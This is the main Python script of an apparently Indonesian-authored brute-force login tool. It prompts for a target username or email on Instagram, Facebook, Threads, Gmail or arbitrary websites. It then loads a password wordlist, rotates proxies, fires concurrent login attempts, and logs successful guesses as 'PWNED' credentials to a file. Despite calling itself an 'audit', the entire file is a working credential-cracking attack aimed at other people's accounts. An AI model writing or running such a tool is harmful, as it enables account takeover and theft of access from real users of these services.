import asyncio
import os
from colorama import Fore, init
from core.proxy_mgr import ProxyManager
from core.engine import JarvisEngine
from core.headers import HeaderGenerator

# Import Modul Terpisah
from targets import instagram, facebook, threads, gmail, web_mail_auth, web_user_auth

init(autoreset=True)

BANNER = f"""
{Fore.RED}██╗  ██╗███████╗███╗   ██╗███████╗
██║  ██║██╔════╝████╗  ██║╚══███╔╝
███████║█████╗  ██╔██╗ ██║  ███╔╝ 
██╔══██║██╔══╝  ██║╚██╗██║ ███╔╝  
██║  ██║███████╗██║ ╚████║███████╗
╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝
{Fore.WHITE}[ V4.5 - TARGETED PROFILING EDITION ]
"""

async def start_audit():
    print(BANNER)
    
    # 1. SETUP PROXY
    try:
        with open("proxies.txt", "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        pm = ProxyManager(proxies)
    except:
        print(f"{Fore.RED}[!] proxies.txt missing. Running RAW (Bahaya).")
        pm = ProxyManager([])

    engine = JarvisEngine(pm)

    # 2. SELECT TARGET
    print(f"{Fore.CYAN}PILIH VEKTOR SERANGAN:")
    print("1. Instagram")
    print("2. Facebook (Mobile API)")
    print("3. Threads")
    print("4. Gmail (Protocol Simulation)")
    print("5. Website Umum (Login via EMAIL)")
    print("6. Website Umum (Login via USERNAME/ID)")
    
    choice = input(f"{Fore.GREEN}>> Input [1-6]: ")
    
    modules = {
        '1': instagram, '2': facebook, '3': threads, 
        '4': gmail, '5': web_mail_auth, '6': web_user_auth
    }
    
    target_module = modules.get(choice)
    if not target_module: return print("Invalid Choice.")

    # 3. SELECT WORDLIST (INTEGRASI GENERATOR)
    target_user = input(f"\n{Fore.YELLOW}[INPUT] Target Username/Email: ")
    
    print(f"\n{Fore.CYAN}PILIH SUMBER PASSWORD:")
    print("1. Gunakan 'pass.txt' Default")
    print("2. Pilih File Custom (Hasil Generator)")
    wl_choice = input(f"{Fore.GREEN}>> Input [1-2]: ")
    
    wordlist_file = "pass.txt"
    if wl_choice == '2':
        # List file .txt di folder saat ini
        txt_files = [f for f in os.listdir('.') if f.endswith('.txt')]
        print("\nFile tersedia:")
        for idx, f in enumerate(txt_files):
            print(f"{idx+1}. {f}")
        try:
            file_idx = int(input(">> Pilih Nomor File: ")) - 1
            wordlist_file = txt_files[file_idx]
        except:
            print("[!] File tidak valid, kembali ke default.")

    # Load Passwords
    try:
        with open(wordlist_file, "r", encoding="utf-8", errors='ignore') as f:
            passwords = [l.strip() for l in f if l.strip()]
    except:
        return print(f"[!] Gagal membuka {wordlist_file}")

    print(f"\n{Fore.RED}[*] MEMULAI SERANGAN PADA: {target_user}")
    print(f"[*] Menggunakan Wordlist: {wordlist_file} ({len(passwords)} payload)")
    print(f"[*] Mode: Async Multi-Threaded\n")

    # 4. EXECUTION
    config = target_module.get_config()
    tasks = []
    
    for pwd in passwords:
        headers = HeaderGenerator.get_headers(config.get('platform', 'web_generic'))
        payload = target_module.get_payload(target_user, pwd)
        tasks.append(engine.execute_audit(config['url'], payload, headers))
        
    responses = await asyncio.gather(*tasks)
    
    # 5. REPORTING
    for i, res in enumerate(responses):
        if res and res.status_code == 200:
             # Logic deteksi sukses sederhana
            if "error" not in res.text.lower() and "fail" not in res.text.lower():
                print(f"{Fore.GREEN}[PWNED] {target_user}:{passwords[i]}")
                with open("pwned.txt", "a") as f: f.write(f"{target_user}:{passwords[i]}\n")
            else:
                print(f"{Fore.RED}[FAIL] {passwords[i]}")
        elif res and res.status_code == 302:
            print(f"{Fore.YELLOW}[FOUND-302] {target_user}:{passwords[i]}")

if __name__ == "__main__":
    asyncio.run(start_audit())
